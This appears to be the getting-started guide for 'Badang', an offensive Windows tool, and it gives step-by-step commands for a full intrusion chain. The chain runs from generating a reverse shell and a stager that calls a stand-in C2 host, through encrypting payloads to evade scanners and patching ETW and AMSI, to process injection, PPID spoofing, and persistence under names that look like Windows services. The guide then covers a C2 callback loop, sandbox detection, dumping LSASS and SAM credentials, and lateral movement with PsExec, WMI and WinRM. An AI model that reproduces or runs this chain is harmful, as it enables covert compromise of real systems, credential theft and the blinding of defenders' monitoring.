# Getting Started with Badang

A hands-on walkthrough from first build to a complete evasion chain. Each section builds on the last.

---

## 1. Build

```bash
git clone https://github.com/aimansam/badang.git
cd badang

# CLI only
cargo build --release --bin badang-cli

# CLI + GUI
cargo build --release --bin badang --features gui
```

Cross-compiling from Linux:

```bash
rustup target add x86_64-pc-windows-gnu
cargo build --release --target x86_64-pc-windows-gnu
cargo build --release --target x86_64-pc-windows-gnu --features gui
```

Binaries land in `target/release/` (or `target/x86_64-pc-windows-gnu/release/`):
- `badang-cli.exe` — command-line interface
- `badang.exe` — native desktop GUI (requires `--features gui`)

Both binaries pass Windows Defender static analysis out of the box. See [build.md](build.md#string-obfuscation-srcobfrs) for how the evasion layers work.

---

## 2. Safety Model

Every command runs in **dry-run mode** by default — it explains what would happen without touching anything. This makes it safe to explore.

```bash
# Dry run (default) — shows what CRT injection does, step by step
badang-cli inject --pid 1234 --technique createremote

# Live execution — requires BOTH flags
badang-cli inject --pid 1234 --technique createremote --payload rev.bin -x -c
```

| Flag | Short | What it does |
|------|-------|-------------|
| `--execute` | `-x` | Enable live execution |
| `--confirm` | `-c` | Confirm you mean it |

Both are required. This prevents accidental execution — you can't pass `-x` alone.

Additional protections:
- System processes (PID < 100) are blocked
- Empty payloads are rejected
- Payload files are validated before use

---

## 3. Reconnaissance

Before doing anything, find a target process and check what the EDR is doing to it.

### List processes

```bash
badang-cli scan
badang-cli scan --filter svchost
badang-cli scan --filter notepad
```

Pick a PID from the output. Good targets: `svchost.exe`, `explorer.exe`, `RuntimeBroker.exe` — long-lived processes that won't be missed.

### Analyze for hooks

```bash
# Dry run — shows what would be scanned
badang-cli analyze --pid 1234

# Live — actually reads process memory
badang-cli analyze --pid 1234 -x -c
```

Output shows each of the 13 NT APIs as `[CLEAN]` or `[MODIFIED]` with the hook type (JMP, PUSH/RET, INT3) and raw bytes. This tells you exactly what the EDR is monitoring.

If APIs are modified, you have three options:
1. **Restore** them (Section 7)
2. **Bypass** them with indirect syscalls (Section 8)
3. **Avoid** them by picking an injection technique that doesn't use the hooked API

---

## 4. Generate a Payload

Badang includes a built-in shellcode generator — no msfvenom or external tools needed.

```bash
# Calculator popup (good for testing)
badang-cli generate --type exec --command "calc.exe" -o calc.bin

# Message box (safest test — just shows a dialog)
badang-cli generate --type messagebox --title "Test" --text "Hello from Badang" -o msg.bin

# Reverse shell
badang-cli generate --type reverse_tcp --lhost 192.168.1.10 --lport 4444 -o rev.bin

# Bind shell
badang-cli generate --type bind_tcp --lport 4444 -o bind.bin

# Stager — download encrypted payload from URL, decrypt, execute
badang-cli generate --type stager --url https://c2.example.com/p.bin --stager-key "s3cret" -o stager.bin
```

All payloads use PEB walking (`gs:[0x60]` to find kernel32) and ROR13 API hashing — no hardcoded addresses.

### Package as source code

Wrap generated shellcode into compilable source templates:

```bash
badang-cli generate --type exec --command calc.exe --package exe -o runner.rs
badang-cli generate --type reverse_tcp --lhost 10.0.0.1 --lport 4444 --package ps1 -o loader.ps1
badang-cli generate --type exec --command calc.exe --package csharp -o runner.cs
badang-cli generate --type exec --command calc.exe --package dll -o lib.rs
```

Each template embeds XOR-encrypted payload with runtime decryption. Formats: `exe` (Rust), `ps1` (PowerShell), `csharp` (C#), `dll` (Rust cdylib).

You can also use external payloads. Verify them first:

```bash
badang-cli load --payload custom_payload.bin
```

This shows the file size, hex dump, and basic validation.

### Convert between formats

```bash
# Hex string to binary file
badang-cli convert -i "fc 48 83 e4 f0 e8 c0 00 00 00" -o payload.bin

# Binary file to C array
badang-cli convert --payload payload.bin --format c

# Binary file to Python bytes
badang-cli convert --payload payload.bin --format python
```

Auto-detects input format (hex, C array, Python bytes, Rust array, raw binary).

---

## 5. Encrypt the Payload

Wrapping the payload in an encryption layer defeats static signature scanning. The output is a single blob: a PIC decryption stub followed by the encrypted payload. It decrypts itself in memory and jumps to the original shellcode.

```bash
# XOR (single byte key)
badang-cli encrypt --payload rev.bin --method xor --key "A" -o encrypted.bin

# XOR (multi-byte key — stronger)
badang-cli encrypt --payload rev.bin --method xor --key "s3cretK3y" -o encrypted.bin

# RC4 (strongest)
badang-cli encrypt --payload rev.bin --method rc4 --key "s3cretK3y" -o encrypted.bin
```

The encrypted output is ready to inject directly — the stub handles decryption at runtime.

---

## 6. Blind the EDR

Before injecting, disable the telemetry channels that report your activity.

### Patch ETW

Event Tracing for Windows (ETW) is how EDRs receive telemetry about process activity — even when user-mode hooks are removed, kernel callbacks feed ETW. Patching the ETW write functions blinds this channel.

```bash
# Dry run — shows what would be patched
badang-cli etw

# Live — patches EtwEventWrite with ret (0xC3)
badang-cli etw -x -c

# Patch a specific target
badang-cli etw --patch NtTraceEvent -x -c
```

Targets: `EtwEventWrite` (default), `EtwEventWriteFull`, `NtTraceEvent`.

### Patch AMSI

The Antimalware Scan Interface (AMSI) scans scripts, .NET assemblies, and PowerShell commands. Patching it makes AMSI return "invalid" for all scans.

```bash
badang-cli amsi -x -c                           # patch AmsiScanBuffer (default)
badang-cli amsi --patch AmsiScanString -x -c     # patch AmsiScanString
```

Both ETW and AMSI patches can be reversed — the original bytes are saved and a restore function is available (in the GUI, click the Restore button after patching).

---

## 7. Restore Hooked APIs (Optional)

If your analysis (Section 3) found modified APIs, you can restore them to their original bytes. This removes the EDR's redirect — your API calls go straight to the kernel.

```bash
# Dry run
badang-cli unhook --unhook NtCreateThreadEx

# Live
badang-cli unhook --unhook NtCreateThreadEx -x -c
```

Three restoration methods are available: Direct Byte (overwrite with clean prologue), Trampoline (patch around the hook), and Inline (redirect execution flow).

**Alternative**: Instead of restoring, use indirect syscalls (Section 8) to bypass the hooks entirely.

---

## 8. Inject

Now you have an encrypted payload, blinded telemetry, and clean (or bypassed) APIs. Pick an injection technique.

### Choose a technique

| Technique | Best when | PID needed |
|-----------|-----------|------------|
| `createremote` | Simple, no stealth needed | Yes |
| `apc` | Target has threads in alertable wait | Yes |
| `hijack` | Need stealth, no new thread or APC | Yes |
| `earlybird` | Want to run before EDR hooks install | No |
| `section` | EDR monitors WriteProcessMemory | Yes |
| `callback` | Need to avoid all thread creation APIs | No |
| `stomp` | Need shellcode in a signed module's memory | No |
| `hollowing` | Full PE replacement in a suspended process | No |

### Run the injection

```bash
# CRT — classic, good for testing
badang-cli inject --pid 1234 --technique createremote --payload encrypted.bin -x -c

# APC — no new thread
badang-cli inject --pid 1234 --technique apc --payload encrypted.bin -x -c

# Thread hijack — no new thread, no APC
badang-cli inject --pid 1234 --technique hijack --payload encrypted.bin -x -c

# Early bird — spawns suspended process, no PID needed
badang-cli inject --technique earlybird --payload encrypted.bin -x -c

# Section mapping — WriteProcessMemory never called
badang-cli inject --pid 1234 --technique section --payload encrypted.bin -x -c

# Callback — no thread creation APIs
badang-cli inject --technique callback --payload encrypted.bin -x -c

# Module stomp — shellcode hides in a signed DLL
badang-cli inject --technique stomp --payload encrypted.bin -x -c

# Process hollowing — full PE replacement
badang-cli inject --technique hollowing --payload pe_payload.exe -x -c
```

Each technique logs its progress step by step, so you can see exactly what's happening.

### Combine with PPID spoofing

For Early Bird injection, you can spawn the target process with a spoofed parent PID first:

```bash
# Spawn notepad.exe as a child of explorer.exe (suspended)
badang-cli ppid --parent explorer.exe --child notepad.exe --suspended -x -c

# Then inject into the suspended child
badang-cli inject --pid <child_pid> --technique apc --payload encrypted.bin -x -c
```

This makes the injected process look like it was spawned by a legitimate parent.

---

## 9. Runtime Evasion

After injection, your payload is running — but memory scanners can still find it. These techniques help it survive.

### Sleep obfuscation

Encrypts your shellcode in memory during sleep periods. A memory scanner running during the sleep window sees encrypted garbage with NOACCESS protection instead of executable shellcode.

```bash
# Dry run — explains the technique
badang-cli sleep --method manual --duration 5000

# Live demo
badang-cli sleep --method manual --duration 5000 -x -c
```

### Stack spoofing

When your shellcode calls Windows APIs, the EDR can walk the call stack and see that the return address points to anonymous executable memory (not a known module). Stack spoofing builds fake frames with return addresses pointing into ntdll and kernel32.

```bash
# Dry run
badang-cli spoof --demo NtAllocateVirtualMemory

# Live demo
badang-cli spoof --demo NtAllocateVirtualMemory -x -c
```

---

## 10. Indirect Syscalls

An alternative to unhooking — instead of restoring the hooked bytes, bypass ntdll entirely by resolving the syscall number at runtime and executing the `syscall` instruction from a gadget inside ntdll's own `.text` section.

```bash
# Dry run — explains Hell's Gate / Halo's Gate
badang-cli syscall --func NtCreateThreadEx --indirect

# Live — resolves SSN and calls via ntdll gadget
badang-cli syscall --func NtAllocateVirtualMemory --indirect -x -c
```

**Hell's Gate**: Reads the SSN directly from a clean function prologue.
**Halo's Gate**: If the target function is hooked, walks to neighboring Zw* exports and calculates the SSN from their offset.

The `syscall` instruction executes from ntdll's own code section, so EDR checks for syscalls originating outside ntdll won't trigger.

---

## 11. Persistence

After gaining execution, configure persistence to survive reboots.

```bash
# Registry Run key — executes at logon
badang-cli persist --method registry --name "UpdateService" --payload runner.exe -x -c

# Scheduled task — ONLOGON trigger
badang-cli persist --method schtask --name "SystemCheck" --payload runner.exe -x -c

# Windows service — auto-start
badang-cli persist --method service --name "WindowsUpdate" --payload svc.exe -x -c

# DLL search order placement
badang-cli persist --method hijack --name version.dll --target "C:\Program Files\App" --payload ver.dll -x -c

# COM component registration
badang-cli persist --method com --target "{CLSID}" --payload server.dll -x -c

# WMI event subscription
badang-cli persist --method wmi --name "SystemEvent" --payload runner.exe -x -c
```

Six methods: `registry`, `schtask`, `wmi`, `hijack`, `com`, `service`. All use dynamic ADVAPI32 API resolution.

---

## Full Operation Example

Putting it all together — a complete evasion chain:

```bash
# 1. Generate and encrypt a reverse shell
badang-cli generate --type reverse_tcp --lhost 192.168.1.10 --lport 4444 -o rev.bin
badang-cli encrypt --payload rev.bin --method rc4 --key "s3cret" -o encrypted.bin

# 2. Blind EDR telemetry
badang-cli etw -x -c
badang-cli amsi -x -c

# 3. Find a target
badang-cli scan --filter svchost

# 4. Check what's hooked
badang-cli analyze --pid 1234 -x -c

# 5. Choose your approach based on what you found:
#    - Hooks on NtCreateThreadEx? Use section mapping or early bird
#    - Hooks on NtWriteVirtualMemory? Use section mapping (no WriteProcessMemory)
#    - Everything hooked? Use indirect syscalls + early bird

# 6. Inject
badang-cli inject --technique earlybird --payload encrypted.bin -x -c

# 7. Reverse shell connects back
#    EDR telemetry is blind (ETW patched)
#    Process tree looks normal (spawned by PPID-spoofed parent)
#    Memory encrypted during sleep (sleep obfuscation)
#    Call stacks show ntdll/kernel32 (stack spoofing)

# 8. Set up persistence
badang-cli persist --method registry --name "UpdateService" --payload encrypted.bin -x -c
```

---

## 12. Communications

After injecting a payload with persistence, connect it back for remote task execution.

```bash
# Dry run — shows the callback sequence
badang-cli comms --channel https --host 10.0.0.1 --comms-port 443

# Live — connect and enter callback loop
badang-cli comms --host 10.0.0.1 --comms-key aabbccddee112233 --interval 30000 --jitter 20 -x -c

# With sleep obfuscation during callback intervals
badang-cli comms --host 10.0.0.1 --comms-key aabbccddee112233 --sleep-obfs -x -c
```

The callback loop: check in → receive tasks → execute → send results → sleep with jitter → repeat. Transport is HTTPS via WinINet with RC4 encryption. Automatic exponential backoff on connection errors.

---

## 13. Pre-Execution Checks

Before deploying, verify the environment is safe to run in. The loader module detects sandboxes, debuggers, and virtual machines.

```bash
# Dry run — shows what checks would run
badang-cli loader --check all

# Live — run all checks
badang-cli loader --check all -x -c

# Check specific category
badang-cli loader --check sandbox -x -c   # timing, process count, disk, user, memory
badang-cli loader --check debug -x -c     # process flag, debug port/flags, timing
badang-cli loader --check vm -x -c        # CPUID hypervisor, registry, MAC prefix

# Terminate if detected
badang-cli loader --check all --action exit -x -c
```

Each check reports CLEAN or FLAGGED with specific details. If any check is flagged and action is `exit`, the process would terminate before proceeding.

---

## 14. Post-Exploitation

After establishing persistence and communications, harvest credentials and move laterally.

### Credential Harvesting

```bash
# Memory snapshot (requires elevated privileges + target PID)
badang-cli postex --module lsass --pid 672 --postex-output dump.bin -x -c

# Registry export (SAM + SYSTEM hives)
badang-cli postex --module sam --postex-output C:\Temp -x -c

# Session delegation (assume another process's identity)
badang-cli postex --module token --pid 672 -x -c
```

### Lateral Movement

```bash
# Remote service execution (PsExec pattern)
badang-cli postex --module psexec --remote 10.0.0.5 --postex-user admin --postex-pass pass --postex-payload svc.exe -x -c

# WMI execution
badang-cli postex --module wmi --remote 10.0.0.5 --postex-cmd "cmd /c whoami" -x -c

# WinRM execution
badang-cli postex --module winrm --remote 10.0.0.5 --postex-cmd "hostname" -x -c
```

Six modules: `lsass`, `sam`, `token` (credentials) and `psexec`, `wmi`, `winrm` (lateral). All use dynamic API resolution — no static imports.

---

## GUI Workflow

The GUI (`badang.exe`) provides the same capabilities with a visual interface:

1. **Scan** tab — browse running processes, pick a target PID
2. **Analyze** tab — scan the target for modified APIs
3. **Load** tab — load a payload file, generate one, or convert formats
4. **ETW / AMSI** tabs — patch with one click, restore when done
5. **Techniques** tab — select technique, load payload, set PID, execute
6. **Restore** tab — restore modified APIs
7. **Syscall** tab — direct or indirect syscall invocation
8. **Stack / Sleep** tabs — runtime evasion demos
9. **Persist** tab — select persistence method, configure, execute
10. **Comms** tab — configure callback channel, transport parameters, execute
11. **Loader** tab — select check category, run environment analysis, view results
12. **PostEx** tab — select post-exploitation module, configure, execute

The top bar shows the current mode (Dry Run / Live) and the Confirm checkbox. The log panel at the bottom shows all output with color-coded severity.

---

## What's Next

- Read [features.md](features.md) for detailed module documentation
- Read [build.md](build.md) for architecture and the static analysis evasion internals
- Read [hooking.md](hooking.md) for background on how EDR hooking works
- Read [killchain.md](killchain.md) for where each module fits in an operation
- Read [cli.md](cli.md) for the complete flag reference
- Read [gui.md](gui.md) for GUI panel details
